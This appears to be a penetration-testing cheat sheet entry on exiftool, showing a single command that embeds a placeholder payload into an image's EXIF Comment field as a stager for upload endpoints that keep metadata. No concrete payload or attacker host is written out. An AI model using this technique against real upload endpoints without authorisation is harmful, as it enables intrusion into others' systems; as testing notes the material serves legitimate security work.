# Exiftool

## exiftool tricks

### Payload inside image

Embed a payload string into the EXIF Comment field. Common stager trick for image-upload endpoints that don't strip metadata before processing.

```sh title:"Embed payload in EXIF Comment of an image"
exiftool -Comment='$payloads' $file
```
<!-- cheat
import payloads
import files
import tun_ip
import webserver
-->

